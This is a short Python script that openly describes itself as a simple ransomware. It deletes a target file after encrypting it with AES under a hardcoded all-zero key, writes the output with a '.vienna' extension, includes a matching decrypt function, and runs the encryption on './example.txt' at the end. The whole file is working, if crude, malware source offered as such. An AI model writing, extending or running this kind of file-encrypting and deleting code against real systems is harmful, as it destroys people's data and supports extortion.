import os
import pyaes

ENC_KEY = b"\x00" * 16

'''
A simple `ransomware` that encrypts files and deletes them.
'''

def encrypt(file_path):
    try:
        with open(file_path, "rb") as file:
            _file_content = file.read()
            file.close()
            os.remove(file_path)
    except (FileNotFoundError, IOError) as e:
        print(e)
        return

    aes = pyaes.AESModeOfOperationCTR(ENC_KEY)
    _file_content_encrypted = aes.encrypt(_file_content)

    new_file = "{}.vienna".format(file_path)

    with open(new_file, "wb") as file:
        file.write(_file_content_encrypted)
        file.close()

def decrypt(file_path):
    try:
        with open(file_path, "rb") as file:
            _file_content = file.read()
            file.close()
            os.remove(file_path)
    except (FileNotFoundError, IOError) as e:
        print(e)
        return

    basename = os.path.basename(file_path).split('.', 1)[0]

    print(basename)
    
    new_file = "{}.txt".format(basename)
    aes = pyaes.AESModeOfOperationCTR(ENC_KEY)
    _file_content_decrypted = aes.decrypt(_file_content)
    with open(new_file, "wb") as file:
            file.write(_file_content_decrypted)
            file.close()

encrypt("./example.txt")
# decrypt("./example.txt.vienna")
